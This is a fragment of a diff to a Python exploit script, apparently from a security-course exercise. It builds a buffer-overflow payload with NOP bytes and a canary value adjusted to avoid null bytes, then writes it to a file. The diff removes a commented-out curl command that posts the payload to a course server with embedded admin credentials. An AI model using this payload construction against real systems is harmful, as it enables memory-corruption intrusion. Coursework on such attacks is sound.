@@ -57,15 +57,4 @@ payload+=postdata+"90909090"+canary.replace('00', '3D')+"90909090"+"90909090"+"9
 
 payload=payload.replace('00', '3D')
 
-
-
 write_binary_data_from_hex("payload.bin", payload)
-
-
-# command = ["curl -X POST http://project-2.csec.chatzi.org:8000/ -H 'Content-Length: 0' -u admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96 --data-binary '@payload.bin' "]    
-# try:
-#     subprocess.run(command,shell=True, timeout=3)  # Set the timeout value in seconds
-# except subprocess.TimeoutExpired:
-#     print("Subprocess execution timed out.")
-# except subprocess.CalledProcessError as e:
-#     print("Subprocess error:", e)
